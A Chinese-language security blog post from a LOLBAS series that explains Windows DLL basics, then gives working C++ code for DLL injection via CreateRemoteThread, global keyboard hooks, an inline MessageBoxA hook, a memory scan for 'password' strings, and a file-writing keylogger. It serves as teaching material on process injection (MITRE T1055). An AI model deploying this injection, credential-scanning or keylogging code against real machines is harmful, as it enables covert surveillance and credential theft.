---
title: "LOLBAS鐵人賽Day27附錄（一）：DLL 基礎語法與實戰應用"
published: 2025-10-10T19:01:49.000Z
description: "LOLBAS 系列第 27 天"
tags: [LOLBAS, Windows, Security]
category: Research
draft: false
---

在過去幾天的文章中，  
應該都會看到很多工具都可以透過DLL來完成攻擊，  
今天我們就來一起看看DLL的相關語法和注入技術應用吧！

## 一DLL 基礎概念

* * *

### 1.1 什麼是 DLL?為何需要 DLL?

DLL (Dynamic Link Library，動態連結程式庫) 是一種特殊的可執行檔格式，  
他包含了可被多個程式同時使用的函數類別資源等  
跟靜態連結庫 (.lib) 不同，DLL 的程式碼不會在編譯時嵌入到執行檔中,  
而是在程式執行時才動態載入到記憶體

**實際應用場景:**

假設我們正在開發一套企業軟體系統,包含了多個模組:客戶管理系統訂單處理系統報表生成系統這三個系統都需要使用相同的資料庫存取功能和加密解密功能

**傳統方式 (靜態連結):**

*   客戶管理系統.exe (50MB,包含 10MB 的資料庫存取程式碼)
*   訂單處理系統.exe (45MB,包含 10MB 的資料庫存取程式碼)
*   報表生成系統.exe (40MB,包含 10MB 的資料庫存取程式碼)
*   總計:135MB,資料庫程式碼重複三次

**使用 DLL 方式:**

*   客戶管理系統.exe (40MB)
*   訂單處理系統.exe (35MB)
*   報表生成系統.exe (30MB)
*   DatabaseLib.dll (10MB,共用)
*   總計:115MB,節省 20MB 空間

除了可以省空間之外，如果資料庫存取邏輯需要更新時，使用 DLL 只需要更新一個 DatabaseLib.dll 檔案，而靜態連結則需要重新編譯並發布三個執行檔

### 1.2 DLL 的核心優勢

#### 優勢一：記憶體效率

當多個程式使用同一個 DLL 時,Windows 只會在記憶體中載入一份 DLL 的程式碼區段,所有程式共享這份程式碼

```
記憶體配置示意:

程式 A (Process A)        程式 B (Process B)        程式 C (Process C)
                    
  程式碼                 程式碼                 程式碼     
                    
  資料區                 資料區                 資料區     
                    
                                                       
       
                                
                         
                          MyLib.dll   
                          (共享程式碼)
                         

```

**實際應用場景:**

假設我們開發了一個影像處理 DLL,包含了各種濾鏡效果當用戶同時開啟多個圖片編輯視窗時，系統只需要載入一次這個 DLL 到記憶體，節省了大量 RAM

#### 優勢二：熱更新能力

DLL 可以在不重新啟動整個系統的情況下更新功能

**實際應用場景 - 遊戲外掛系統:**

許多遊戲採用 DLL 插件架構，讓玩家可以安裝第三方模組:

```
遊戲主程式.exe
 plugins/
    GraphicsEnhancer.dll (畫質增強)
    UICustomizer.dll (介面自訂)
    AudioMod.dll (音效模組)

```

遊戲執行中，玩家可以隨時啟用或停用某個 DLL 插件，無需重啟遊戲

#### 優勢三：語言互通性

DLL 可以讓不同程式語言開發的程式互相調用

**實際應用場景 - Python 調用 C++ DLL:**

假設我們用 Python 開發了一個數據分析工具，但某些運算密集的功能用 Python 執行太慢，就可以將這些功能用 C++ 寫成 DLL，讓 Python 程式調用來大幅提升效能

```python
# Python 程式
import ctypes

# 載入 C++ 編寫的高效能運算 DLL
math_dll = ctypes.CDLL('FastMath.dll')

# 調用 DLL 中的函數
math_dll.ComplexCalculation.argtypes = [ctypes.POINTER(ctypes.c_double), ctypes.c_int]
result = math_dll.ComplexCalculation(data_pointer, data_size)

```

### 1.3 DLL 的載入方式詳解

Windows 提供兩種載入 DLL 的方式，各有其適用場景

#### 隱式連結 (Implicit Linking / Load-Time Dynamic Linking)

程式啟動時，Windows 載入器會自動載入所有需要的 DLL

**運作流程:**

1.  程式啟動
2.  Windows 讀取 PE 檔案的 Import Table
3.  自動載入所有相依的 DLL
4.  解析函數位址
5.  執行程式主要邏輯

**實際應用場景:**

適用於程式核心功能,必須一直可用的 DLL例如:

*   資料庫連線模組 (程式全程需要)
*   日誌記錄系統 (程式全程需要)
*   授權驗證模組 (啟動時就要檢查)

**優點:**

*   程式碼簡潔,使用方便
*   編譯時期即可檢查函數是否存在
*   函數調用效能較高

**缺點:**

*   如果 DLL 不存在,程式無法啟動
*   所有 DLL 在啟動時就載入,增加啟動時間
*   無法根據執行狀態決定是否載入

#### 顯式連結 (Explicit Linking / Run-Time Dynamic Linking)

程式執行過程中,根據需要動態載入 DLL

**運作流程:**

1.  程式正常啟動
2.  執行到需要功能時
3.  使用 LoadLibrary 載入 DLL
4.  使用 GetProcAddress 取得函數位址
5.  調用函數
6.  使用 FreeLibrary 卸載 DLL

**實際應用場景 - 插件系統:**

```
防毒軟體架構:
AntiVirus.exe
    
     (啟動時) CoreEngine.dll (病毒掃描核心,隱式連結)
    
     (用戶點擊掃描) QuickScan.dll (快速掃描,顯式連結)
     (用戶點擊深度掃描) DeepScan.dll (深度掃描,顯式連結)
     (用戶開啟設定) SettingsUI.dll (設定介面,顯式連結)

```

**優點:**

*   可選擇性載入,節省記憶體
*   DLL 不存在時程式仍可運行
*   可以在執行時期選擇不同版本的 DLL
*   適合插件架構

**缺點:**

*   程式碼較複雜
*   需要手動管理 DLL 的載入和卸載
*   函數調用需要透過函數指標,稍微降低效能
*   編譯時期無法檢查函數是否存在

## 二建立基本 DLL

* * *

### DllMain 函數結構

```cpp
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // DLL 被載入時執行
        MessageBoxA(NULL, "DLL 已載入", "通知", MB_OK);
        CreateThread(NULL, 0, MyThread, NULL, 0, NULL);
        break;
    case DLL_PROCESS_DETACH:
        // DLL 被刪除時執行
        break;
    }
    return TRUE;
}

DWORD WINAPI MyThread(LPVOID lpParam)
{
    // 你的程式碼
    return 0;
}

```

**參數說明：**

*   `hModule`: DLL 模組句柄
*   `ul_reason_for_call`: 呼叫原因（ATTACH/DETACH）
*   `lpReserved`: 保留參數

### 匯出函數

**方法一：使用 \_\_declspec(dllexport)**

```cpp
extern "C" __declspec(dllexport) int Add(int a, int b)
{
    return a + b;
}

extern "C" __declspec(dllexport) void ShowMessage(const char* msg)
{
    MessageBoxA(NULL, msg, "訊息", MB_OK);
}

```

**方法二：使用 .def 檔案**

```def
; MyDLL.def
LIBRARY MyDLL
EXPORTS
    Add
    ShowMessage

```

### 編譯 DLL

```bash
# Visual Studio 命令提示字元
cl /LD MyDLL.cpp /link /OUT:MyDLL.dll

# 64位元版本
cl /LD MyDLL.cpp /link /MACHINE:X64 /OUT:MyDLL64.dll

```

## 三關鍵 Windows API

* * *

### 程序與記憶體操作

```cpp
// 開啟程序
HANDLE hProcess = OpenProcess(
    PROCESS_ALL_ACCESS,  // 存取權限
    FALSE,               // 不繼承句柄
    processId           // 目標程序 PID
);

// 配置遠端記憶體
LPVOID pRemote = VirtualAllocEx(
    hProcess,                      // 程序句柄
    NULL,                          // 位址（NULL=自動）
    1024,                          // 大小
    MEM_COMMIT | MEM_RESERVE,      // 配置類型
    PAGE_READWRITE                 // 保護屬性
);

// 寫入遠端記憶體
WriteProcessMemory(
    hProcess,      // 程序句柄
    pRemote,       // 目標位址
    data,          // 資料
    dataSize,      // 大小
    NULL           // 實際寫入大小
);

// 建立遠端執行緒
HANDLE hThread = CreateRemoteThread(
    hProcess,              // 程序句柄
    NULL,                  // 安全屬性
    0,                     // 堆疊大小
    (LPTHREAD_START_ROUTINE)pLoadLibrary,  // 起始位址
    pRemote,               // 參數
    0,                     // 建立旗標
    NULL                   // 執行緒 ID
);

// 等待執行緒結束
WaitForSingleObject(hThread, INFINITE);

// 清理
VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
CloseHandle(hThread);
CloseHandle(hProcess);

```

### 取得程序 PID

```cpp
#include <tlhelp32.h>

DWORD GetProcessIdByName(const wchar_t* processName)
{
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(hSnapshot, &pe32))
    {
        do {
            if (wcscmp(pe32.szExeFile, processName) == 0)
            {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return 0;
}

```

## 四DLL 注入技術

* * *

### 方法一：LoadLibrary 注入

```cpp
bool InjectDLL(DWORD pid, const wchar_t* dllPath)
{
    // 1. 開啟目標程序
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        FALSE, pid);
    if (!hProcess) return false;

    // 2. 配置記憶體存放 DLL 路徑
    SIZE_T pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    LPVOID pRemote = VirtualAllocEx(hProcess, NULL, pathSize, 
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemote) {
        CloseHandle(hProcess);
        return false;
    }

    // 3. 寫入 DLL 路徑
    WriteProcessMemory(hProcess, pRemote, dllPath, pathSize, NULL);

    // 4. 取得 LoadLibraryW 位址
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(
        GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");

    // 5. 建立遠端執行緒執行 LoadLibrary
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemote, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    // 6. 清理
    VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return (hThread != NULL);
}

int main()
{
    DWORD pid = GetProcessIdByName(L"notepad.exe");
    if (pid) {
        InjectDLL(pid, L"C:\\MyDLL.dll");
    }
    return 0;
}

```

### 方法二：SetWindowsHookEx（Global Hook）

**Hook DLL：**

```cpp
#include <windows.h>

HHOOK g_hHook = NULL;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        // 處理鍵盤事件
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        // 記錄按鍵到檔案
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

extern "C" __declspec(dllexport) BOOL InstallHook(HINSTANCE hInstance)
{
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    return (g_hHook != NULL);
}

extern "C" __declspec(dllexport) BOOL UninstallHook()
{
    return UnhookWindowsHookEx(g_hHook);
}

```

**安裝 Hook：**

```cpp
HMODULE hDll = LoadLibrary(L"HookDLL.dll");
typedef BOOL (*InstallFunc)(HINSTANCE);
InstallFunc Install = (InstallFunc)GetProcAddress(hDll, "InstallHook");

if (Install) {
    Install((HINSTANCE)hDll);
    
    // 保持訊息 Loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

```

## 五實際應用場景

* * *

### 1\. 記憶體修改（遊戲修改器）

```cpp
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved)
{
    if (reason == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, ModifyMemory, NULL, 0, NULL);
    }
    return TRUE;
}

DWORD WINAPI ModifyMemory(LPVOID lpParam)
{
    Sleep(3000);  // 等待遊戲初始化
    
    // 修改記憶體中的數值
    DWORD* healthAddr = (DWORD*)0x12345678;
    DWORD oldProtect;
    
    VirtualProtect(healthAddr, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &oldProtect);
    *healthAddr = 9999;  // 修改血量
    VirtualProtect(healthAddr, sizeof(DWORD), oldProtect, &oldProtect);
    
    return 0;
}

```

### 2\. API Hook（攔截函數呼叫）

```cpp
typedef int (WINAPI *MessageBoxAFunc)(HWND, LPCSTR, LPCSTR, UINT);
MessageBoxAFunc OriginalMessageBoxA = NULL;

int WINAPI HookedMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
{
    // 記錄到檔案
    FILE* f = fopen("C:\\log.txt", "a");
    fprintf(f, "MessageBox: %s - %s\n", lpCaption, lpText);
    fclose(f);
    
    // 呼叫原始函數
    return OriginalMessageBoxA(hWnd, lpText, lpCaption, uType);
}

void InstallHook()
{
    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    LPVOID pMsgBox = GetProcAddress(hUser32, "MessageBoxA");
    
    // 簡化的 Inline Hook
    DWORD oldProtect;
    VirtualProtect(pMsgBox, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // 寫入 JMP 指令跳轉到 Hook 函數
    BYTE jmp[5] = { 0xE9, 0, 0, 0, 0 };
    DWORD offset = (DWORD)HookedMessageBoxA - (DWORD)pMsgBox - 5;
    memcpy(&jmp[1], &offset, 4);
    memcpy(pMsgBox, jmp, 5);
    
    VirtualProtect(pMsgBox, 5, oldProtect, &oldProtect);
}

```

### 3\. 資料擷取

```cpp
DWORD WINAPI DataExtractor(LPVOID lpParam)
{
    FILE* output = fopen("C:\\dump.txt", "w");
    
    // 掃描記憶體尋找特定字串
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID addr = NULL;
    
    while (VirtualQuery(addr, &mbi, sizeof(mbi)))
    {
        if (mbi.State == MEM_COMMIT && mbi.Protect == PAGE_READWRITE)
        {
            char* buffer = new char[mbi.RegionSize];
            if (ReadProcessMemory(GetCurrentProcess(), mbi.BaseAddress, 
                buffer, mbi.RegionSize, NULL))
            {
                // 搜尋 "password" 字串
                for (SIZE_T i = 0; i < mbi.RegionSize - 8; i++) {
                    if (memcmp(&buffer[i], "password", 8) == 0) {
                        fprintf(output, "Found at: 0x%p\n", 
                               (void*)((DWORD)mbi.BaseAddress + i));
                    }
                }
            }
            delete[] buffer;
        }
        addr = (LPVOID)((DWORD)mbi.BaseAddress + mbi.RegionSize);
    }
    
    fclose(output);
    return 0;
}

```

### 4\. 鍵盤記錄器

```cpp
HHOOK g_hHook = NULL;

LRESULT CALLBACK KeyLogger(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        
        FILE* f = fopen("C:\\keylog.txt", "a");
        fprintf(f, "Key: %d\n", p->vkCode);
        fclose(f);
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

void StartKeyLogger()
{
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogger, 
                               GetModuleHandle(NULL), 0);
}

```

## 六總結

* * *

### 關鍵技術點

1.  **DllMain** 是 DLL 的進入點，處理載入/卸載事件
2.  **遠端執行緒注入** 是最常用的 DLL 注入方法
3.  **API Hook** 可以攔截和修改函數行為
4.  **記憶體操作** 需要適當的權限和保護設定

### 注意事項

*   64 位元程序需要 64 位元 DLL
*   需要管理員權限注入系統程序
*   記得在虛擬環境中測試，才不會把自己電腦搞壞 XD

## 七參考資源

* * *

[Microsoft MSDN：Windows API 文件](https://learn.microsoft.com/zh-tw/windows/win32/apiindex/windows-api-list)  
Windows Internals：深入理解 Windows 運作  
[danielkrupinski/Osiris - Github](https://github.com/danielkrupinski/Osiris)  
[IDouble/Simple-DLL-Injection - Github](https://github.com/IDouble/Simple-DLL-Injection)  
[MITRE ATT&CK：T1055（Process Injection）](https://attack.mitre.org/techniques/T1055/)